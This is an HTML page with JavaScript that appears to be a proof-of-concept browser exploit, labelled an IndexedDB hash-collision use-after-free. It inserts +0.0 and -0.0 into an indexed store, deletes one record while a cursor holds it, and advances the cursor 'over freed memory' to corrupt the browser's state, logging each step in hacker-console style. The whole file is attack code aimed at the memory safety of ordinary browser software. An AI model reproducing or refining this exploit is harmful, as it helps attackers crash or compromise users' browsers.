<!DOCTYPE html>
<html>
<head>
<style>
body { background:#000; color:#0f0; font-family:monospace; font-size:13px; padding:8px; }
.info { color:#0ff; } .hit { color:#f0f; font-weight:bold; } .warn { color:#ff0; }
</style>
</head>
<body>
<div id="log"></div>
<script>
function log(m,c){var d=document.createElement("div");d.className=c||'';d.textContent=m;document.getElementById("log").appendChild(d);}

log("=== INDEXEDDB HASH COLLISION USE-AFTER-FREE (V2) ===", "info");
log("[*] Opening database and setting up the trap...", "info");

let request = indexedDB.open("UAF_DB_V2_" + Date.now(), 1);

request.onupgradeneeded = (e) => {
    let db = e.target.result;
    let store = db.createObjectStore("store", { keyPath: "id" });
    store.createIndex("idx", "value");
    log("[*] Database created with index 'idx'", "info");
};

request.onsuccess = (e) => {
    let db = e.target.result;
    log("[*] Database opened. Starting transaction...", "info");
    
    let tx = db.transaction("store", "readwrite");
    let store = tx.objectStore("store");

    log("[!] Inserting +0.0 and -0.0...", "warn");
    store.put({ id: 1, value: 0.0 });
    store.put({ id: 2, value: -0.0 });

    tx.oncomplete = () => {
        log("[*] Insertion complete. Now we break the HashMap...", "info");
        
        let tx2 = db.transaction("store", "readwrite");
        let store2 = tx2.objectStore("store");
        let index = store2.index("idx");

        let cursorReq = index.openCursor();
        let firstCursor = true;

        cursorReq.onsuccess = (event) => {
            let cursor = event.target.result;
            if (cursor && firstCursor) {
                firstCursor = false;
                log("[!] Cursor opened. Holding reference to the record...", "warn");
                
                log("[!] Deleting +0.0 to corrupt the map...", "hit");
                // DO NOT USE SETTIMEOUT! Keep the transaction active!
                let delReq = store2.delete(1); 
                
                delReq.onsuccess = () => {
                    log("[*] Delete processed! The map is corrupted!", "warn");
                    log("[*] Advancing cursor over FREED MEMORY...", "hit");
                    try {
                        cursor.continue();
                    } catch(e) {
                        log("[-] Error: " + e.message, "info");
                    }
                };
            } else if (cursor) {
                log("[-] Cursor advanced successfully (No crash? Maybe the allocator got lucky)", "info");
            }
        };
    };
};
</script>
</body>
</html>
